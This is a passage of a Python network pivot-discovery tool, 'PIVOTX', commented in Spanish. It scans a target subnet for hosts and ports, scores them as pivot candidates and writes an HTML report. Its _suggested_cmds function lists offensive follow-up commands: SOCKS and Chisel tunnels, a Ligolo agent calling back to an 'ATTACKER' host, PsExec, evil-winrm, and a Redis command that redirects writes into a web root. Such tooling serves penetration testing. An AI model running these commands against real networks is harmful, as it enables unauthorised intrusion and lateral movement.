    const r = Math.min(W(), H()) * 0.32;
    positions[i] = {{
      x: W()/2 + Math.cos(angle) * r,
      y: H()/2 + Math.sin(angle) * r
    }};
  }}
}}
initPositions();

function drawMap() {{
  ctx.clearRect(0, 0, W(), H());
  animT += 0.02;

  // Fondo grid
  ctx.strokeStyle = 'rgba(0,212,255,0.03)';
  ctx.lineWidth = 1;
  for (let x = 0; x < W(); x += 40) {{ ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,H()); ctx.stroke(); }}
  for (let y = 0; y < H(); y += 40) {{ ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W(),y); ctx.stroke(); }}

  // Edges
  EDGES.forEach(e => {{
    const a = positions[e.from], b = positions[e.to];
    if (!a || !b) return;
    ctx.beginPath();
    ctx.moveTo(a.x, a.y);
    ctx.lineTo(b.x, b.y);
    ctx.strokeStyle = 'rgba(0,212,255,0.15)';
    ctx.lineWidth = 1;
    ctx.setLineDash([4,6]);
    ctx.stroke();
    ctx.setLineDash([]);
  }});

  // Nodes
  NODES.forEach((node, i) => {{
    const p = positions[i];
    if (!p) return;
    const pulse = 1 + Math.sin(animT + i * 0.7) * 0.12;
    const r = Math.max(6, Math.min(16, 6 + node.score / 18)) * pulse;

    // Glow
    const grad = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, r * 3);
    grad.addColorStop(0, node.color + '50');
    grad.addColorStop(1, 'transparent');
    ctx.beginPath();
    ctx.arc(p.x, p.y, r * 3, 0, Math.PI*2);
    ctx.fillStyle = grad;
    ctx.fill();

    // Circle
    ctx.beginPath();
    ctx.arc(p.x, p.y, r, 0, Math.PI*2);
    ctx.fillStyle = '#050608';
    ctx.fill();
    ctx.strokeStyle = node.color;
    ctx.lineWidth = 1.5;
    ctx.shadowColor = node.color;
    ctx.shadowBlur = 8;
    ctx.stroke();
    ctx.shadowBlur = 0;

    // Label
    ctx.fillStyle = node.color;
    ctx.font = '9px Share Tech Mono, monospace';
    ctx.globalAlpha = 0.85;
    ctx.fillText(node.ip, p.x + r + 5, p.y + 4);
    ctx.globalAlpha = 1;

    // Puerto count badge
    if (node.ports > 0) {{
      ctx.fillStyle = node.color;
      ctx.font = 'bold 8px Share Tech Mono, monospace';
      ctx.fillText(node.ports + 'p', p.x - 6, p.y + 3);
    }}
  }});

  requestAnimationFrame(drawMap);
}}
drawMap();

// Drag
canvas.addEventListener('mousedown', e => {{
  const rect = canvas.getBoundingClientRect();
  const mx = e.clientX - rect.left, my = e.clientY - rect.top;
  NODES.forEach((n, i) => {{
    const p = positions[i];
    if (!p) return;
    const dx = mx - p.x, dy = my - p.y;
    if (Math.sqrt(dx*dx+dy*dy) < 20) {{
      dragging = i;
      dragOffset = {{x:dx,y:dy}};
    }}
  }});
}});
canvas.addEventListener('mousemove', e => {{
  const rect = canvas.getBoundingClientRect();
  const mx = e.clientX - rect.left, my = e.clientY - rect.top;
  if (dragging !== null) {{
    positions[dragging] = {{x: mx - dragOffset.x, y: my - dragOffset.y}};
  }}
  // Tooltip
  let hit = false;
  NODES.forEach((node, i) => {{
    const p = positions[i];
    if (!p) return;
    const dx = mx - p.x, dy = my - p.y;
    if (Math.sqrt(dx*dx+dy*dy) < 20) {{
      tooltip.style.display = 'block';
      tooltip.style.left = (e.clientX + 12) + 'px';
      tooltip.style.top  = (e.clientY - 10) + 'px';
      tooltip.innerHTML  = `<b style="color:${{node.color}}">${{node.ip}}</b><br>${{node.role}}<br>RIESGO: <b style="color:${{node.color}}">${{node.risk}}</b><br>PUERTOS: ${{node.ports}}<br>SCORE: ${{node.score}}`;
      hit = true;
    }}
  }});
  if (!hit) tooltip.style.display = 'none';
}});
canvas.addEventListener('mouseup', () => dragging = null);

// ══════════════════════════════════════
//  GRÁFICO DE BARRAS — Chart.js
// ══════════════════════════════════════
const barCtx = document.getElementById('barChart').getContext('2d');
new Chart(barCtx, {{
  type: 'bar',
  data: {{
    labels: {bar_labels},
    datasets: [{{
      label: 'Hosts con este puerto',
      data: {bar_values},
      backgroundColor: {bar_colors}.map(c => c + '55'),
      borderColor: {bar_colors},
      borderWidth: 1.5,
      borderRadius: 2,
    }}]
  }},
  options: {{
    indexAxis: 'y',
    responsive: true,
    maintainAspectRatio: false,
    plugins: {{
      legend: {{ display: false }},
      tooltip: {{
        backgroundColor: '#0d1117',
        borderColor: '#1a2535',
        borderWidth: 1,
        titleFont: {{ family: 'Share Tech Mono', size: 11 }},
        bodyFont:  {{ family: 'Share Tech Mono', size: 10 }},
        titleColor: '#00d4ff',
        bodyColor:  '#c8d8e8',
      }}
    }},
    scales: {{
      x: {{
        ticks: {{ color: '#3d5a73', font: {{ family: 'Share Tech Mono', size: 9 }} }},
        grid:  {{ color: 'rgba(26,37,53,0.8)' }},
        border:{{ color: '#1a2535' }}
      }},
      y: {{
        ticks: {{ color: '#7a9ab5', font: {{ family: 'Share Tech Mono', size: 9 }} }},
        grid:  {{ color: 'rgba(26,37,53,0.4)' }},
        border:{{ color: '#1a2535' }}
      }}
    }}
  }}
}});

// ══════════════════════════════════════
//  EXPAND ROWS
// ══════════════════════════════════════
function toggleExpand(i) {{
  const row = document.getElementById('expand-' + i);
  row.style.display = row.style.display === 'none' ? 'table-row' : 'none';
}}
</script>
</body>
</html>"""
    return html

def _suggested_cmds(ip: str, ports: dict) -> str:
    cmds = []
    plist = list(ports.keys())

    if 22 in plist:
        cmds.append(f'# SSH SOCKS5 tunnel\nssh -D 1080 -N user@{ip}')
        cmds.append(f'# Chisel pivot\nchisel client {ip}:8080 R:socks')
        cmds.append(f'# Ligolo-ng\n./agent -connect ATTACKER:11601 -ignore-cert')

    if 445 in plist:
        cmds.append(f'# SMB enum\nnxc smb {ip} -u "" -p "" --shares')
        cmds.append(f'# PSExec\nimpacket-psexec DOMAIN/user@{ip}')

    if 3389 in plist:
        cmds.append(f'# RDP\nxfreerdp /u:user /p:pass /v:{ip}')

    if 5985 in plist:
        cmds.append(f'# WinRM\nevil-winrm -i {ip} -u user -p pass')

    if 3306 in plist:
        cmds.append(f'# MySQL\nmysql -h {ip} -u root -p')

    if 6379 in plist:
        cmds.append(f'# Redis (no-auth)\nredis-cli -h {ip} CONFIG SET dir /var/www/html')

    if 9200 in plist:
        cmds.append(f'# Elasticsearch\ncurl http://{ip}:9200/_cat/indices')

    if not cmds:
        cmds.append(f'# Nmap detallado\nnmap -sV -sC -p- {ip}')

    out = ''
    for cmd in cmds[:4]:
        out += f'<div class="cmd-block">{cmd}</div>'
    return out or '<span class="small-gray">Sin comandos sugeridos</span>'


# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════

def print_host_result(host: dict):
    ip      = host['ip']
    role    = host['analysis']['role']
    risk    = host['analysis']['risk']
    ports   = host['ports']
    methods = host['analysis']['pivot_methods']
    score   = host.get('pivot_score', 0)

    risk_clr = {
        'CRITICAL': C.RED, 'HIGH': C.YELLOW,
        'MEDIUM': C.CYAN, 'LOW': C.GRAY
    }.get(risk, C.GRAY)

    print(f"\n  {C.BOLD}{C.CYAN}{'─'*60}{C.RESET}")
    print(f"  {C.BOLD}{ip}{C.RESET}  {C.GRAY}{host.get('hostname','')}{C.RESET}")
    print(f"  Rol: {C.PURPLE}{role}{C.RESET}   Riesgo: {risk_clr}{C.BOLD}{risk}{C.RESET}   Score: {C.YELLOW}{score}{C.RESET}")

    if ports:
        port_str = '  '.join(
            f"{C.GREEN}{p}{C.RESET}/{C.GRAY}{info['service']}{C.RESET}"
            for p, info in sorted(ports.items())
        )
        print(f"  Puertos: {port_str}")

    if methods:
        print(f"  {C.YELLOW}Pivot:{C.RESET} {', '.join(methods[:3])}")


def resolve_output_path(output_arg: str, dir_arg: str, network: str) -> str:
    """
    Resuelve la ruta final del reporte.
    Alias de carpetas: descargas, documentos, escritorio, home, actual
    Si --output no tiene directorio y se pasó --dir, combina ambos.
    Agrega timestamp al nombre si el archivo ya existe.
    """
    import pwd
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        HOME = pwd.getpwnam(sudo_user).pw_dir
    else:
        HOME = os.path.expanduser("~")

    # Detectar si las carpetas existen en español o inglés (Zorin/Ubuntu en español vs inglés)
    def _folder(es_name, en_name):
        es_path = os.path.join(HOME, es_name)
        en_path = os.path.join(HOME, en_name)
        if os.path.isdir(es_path):
            return es_path
        elif os.path.isdir(en_path):
            return en_path
        else:
            # Si no existe ninguna, crear la española
            os.makedirs(es_path, exist_ok=True)
            return es_path

    DIR_ALIASES = {
        'descargas':  _folder('Descargas', 'Downloads'),
        'downloads':  _folder('Descargas', 'Downloads'),
        'documentos': _folder('Documentos', 'Documents'),
        'documents':  _folder('Documentos', 'Documents'),
        'escritorio': _folder('Escritorio', 'Desktop'),
        'desktop':    _folder('Escritorio', 'Desktop'),
        'home':       HOME,
        'actual':     os.getcwd(),
        'cwd':        os.getcwd(),
    }

    # Resolver directorio destino
    if dir_arg:
        target_dir = DIR_ALIASES.get(dir_arg.lower(), os.path.expanduser(dir_arg))
    else:
        # Si --output trae ruta absoluta/relativa con directorio, usarla
        target_dir = os.path.dirname(os.path.abspath(output_arg)) if os.path.dirname(output_arg) else os.getcwd()

    # Nombre del archivo (solo el basename de --output)
    filename = os.path.basename(output_arg)

    # Si el nombre es el default y se pasó --dir, generar nombre con red + fecha
    if filename == 'pivotx_report.html' and dir_arg:
        net_safe = network.replace('/', '_').replace('.', '-')
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'pivotx_{net_safe}_{ts}.html'

    full_path = os.path.join(target_dir, filename)

    # Si ya existe, agregar timestamp para no pisar
    if os.path.exists(full_path):
        base, ext = os.path.splitext(filename)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'{base}_{ts}{ext}'
        full_path = os.path.join(target_dir, filename)

    # Crear directorio si no existe
    os.makedirs(target_dir, exist_ok=True)

    return full_path


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description='PIVOTX — Network Pivot Discovery Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C.CYAN}Ejemplos:{C.RESET}
  sudo python3 pivotx.py -n 192.168.1.0/24
  sudo python3 pivotx.py -n 192.168.1.0/24 --dir descargas
  sudo python3 pivotx.py -n 192.168.1.0/24 --dir documentos -o mi_reporte.html
  sudo python3 pivotx.py -n 192.168.1.0/24 --dir escritorio -p top50
  sudo python3 pivotx.py -n 192.168.1.0/24 --dir /ruta/personalizada
  sudo python3 pivotx.py -n 10.10.0.0/16 -p all --no-banner -t 200

{C.CYAN}Alias de carpetas para --dir:{C.RESET}
  descargas / downloads   → ~/Downloads
  documentos / documents  → ~/Documents
  escritorio / desktop    → ~/Desktop
  home                    → ~/
  actual / cwd            → directorio actual
        """
    )
    parser.add_argument('-n', '--network',  required=True, help='Target network in CIDR notation (e.g: 192.168.1.0/24, 10.0.0.0/8)')
    parser.add_argument('-p', '--ports',    default='pivot', choices=['pivot','top50','top100','all'], help='Set de puertos')
    parser.add_argument('-o', '--output',   default='pivotx_report.html', help='Nombre del archivo HTML (default: pivotx_report.html)')
    parser.add_argument('-d', '--dir',      default='', metavar='CARPETA',
                        help='Carpeta destino: descargas, documentos, escritorio, home, actual, o ruta absoluta')
    parser.add_argument('-t', '--threads',  type=int, default=100, help='Hilos para port scan (default: 100)')
    parser.add_argument('--no-banner',      action='store_true', help='No hacer banner grabbing')
    parser.add_argument('--ping-only',      action='store_true', help='Solo descubrir hosts, sin port scan')
    parser.add_argument('--top',            type=int, default=0, help='Mostrar solo top N hosts por score')
    args = parser.parse_args()

    # Resolver ruta de salida
    output_path = resolve_output_path(args.output, args.dir, args.network)

    # Verificar root
    if os.geteuid() != 0:
        print(f"  {C.YELLOW}[!]{C.RESET} Corriendo sin root — usando ping sweep (ARP requiere root)")

    # Determinar puertos
    port_presets = {
        'pivot': list(PIVOT_PORTS.keys()),
        'top50': [21,22,23,25,53,80,110,111,135,139,143,389,443,445,636,
                  993,995,1080,1433,1521,3306,3389,4444,5432,5900,5985,
                  6379,8080,8443,8888,9200,27017],
        'top100': list(range(1, 1025)) + [3306,3389,5432,5900,5985,6379,8080,8443,8888,9200,27017],
        'all': list(PIVOT_PORTS.keys()) + list(range(1, 10000)),
    }
    ports_to_scan = sorted(set(port_presets[args.ports]))

    print(f"  {C.CYAN}[*]{C.RESET} Red objetivo : {C.BOLD}{args.network}{C.RESET}")
    print(f"  {C.CYAN}[*]{C.RESET} Puertos      : {C.BOLD}{len(ports_to_scan)}{C.RESET} ({args.ports})")
    print(f"  {C.CYAN}[*]{C.RESET} Hilos        : {C.BOLD}{args.threads}{C.RESET}")
    print(f"  {C.CYAN}[*]{C.RESET} Reporte      : {C.BOLD}{output_path}{C.RESET}")
    print()

    start_time = time.time()

    # ── FASE 1: Descubrimiento ──────────────────────────────
    print(f"{C.CYAN}{C.BOLD}[FASE 1]{C.RESET} Descubrimiento de hosts...")
    live_hosts = discover_hosts(args.network)

    if not live_hosts:
        print(f"\n  {C.RED}[-]{C.RESET} No se encontraron hosts activos.")
        sys.exit(0)

    print(f"\n  {C.GREEN}[+]{C.RESET} {len(live_hosts)} hosts activos encontrados\n")

    if args.ping_only:
        for h in live_hosts:
            print(f"  {C.GREEN}●{C.RESET} {h['ip']}  {C.GRAY}{h['mac']}{C.RESET}")
        sys.exit(0)

    # ── FASE 2: Port Scan ──────────────────────────────────
    print(f"{C.CYAN}{C.BOLD}[FASE 2]{C.RESET} Escaneando puertos...")
    results = []

    for idx, host in enumerate(live_hosts):
        ip = host['ip']
        print(f"\n  {C.CYAN}[{idx+1}/{len(live_hosts)}]{C.RESET} Escaneando {ip}...")

        hostname = get_hostname(ip)
        ports_found = scan_host(ip, ports_to_scan, args.threads, not args.no_banner)

        analysis = classify_host(ip, ports_found)

        result = {
            'ip': ip,
            'mac': host.get('mac', 'N/A'),
            'hostname': hostname,
            'ports': ports_found,
            'analysis': analysis,
            'method': host.get('method', 'PING'),
        }
        results.append(result)
        print_host_result(result)

    # ── FASE 3: Pivot Analysis ─────────────────────────────
    print(f"\n\n{C.CYAN}{C.BOLD}[FASE 3]{C.RESET} Analizando rutas de pivot...")
    results = build_pivot_chain(results)

    print(f"\n  {C.BOLD}{'─'*50}{C.RESET}")
    print(f"  {C.BOLD}TOP HOSTS PARA PIVOTING:{C.RESET}")
    for i, h in enumerate(results[:5], 1):
        rc = {'CRITICAL': C.RED, 'HIGH': C.YELLOW, 'MEDIUM': C.CYAN, 'LOW': C.GRAY}
        clr = rc.get(h['analysis']['risk'], C.GRAY)
        methods = ', '.join(h['analysis']['pivot_methods'][:2])
        print(f"  {clr}#{i}{C.RESET}  {C.BOLD}{h['ip']:18}{C.RESET}  {h['analysis']['role']:22}  {clr}{h['analysis']['risk']:9}{C.RESET}  {C.GRAY}{methods}{C.RESET}")

    # ── FASE 4: Reporte HTML ───────────────────────────────
    print(f"\n{C.CYAN}{C.BOLD}[FASE 4]{C.RESET} Generando reporte HTML...")
    duration = time.time() - start_time
    scan_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if args.top:
        results = results[:args.top]

    html = generate_html_report(results, args.network, scan_time, duration)
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(html)

    print(f"\n  {C.GREEN}[+]{C.RESET} Reporte guardado:")
    print(f"      {C.BOLD}{C.CYAN}{output_path}{C.RESET}")
    print(f"  {C.CYAN}[*]{C.RESET} Duración total  : {C.BOLD}{duration:.1f}s{C.RESET}")
    print(f"  {C.CYAN}[*]{C.RESET} Hosts escaneados: {C.BOLD}{len(results)}{C.RESET}")
    print(f"\n  {C.GRAY}Abrí el reporte con:{C.RESET}")
    print(f"  {C.CYAN}firefox \"{output_path}\"{C.RESET}\n")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.YELLOW}[!]{C.RESET} Interrumpido por usuario\n")
        sys.exit(0)
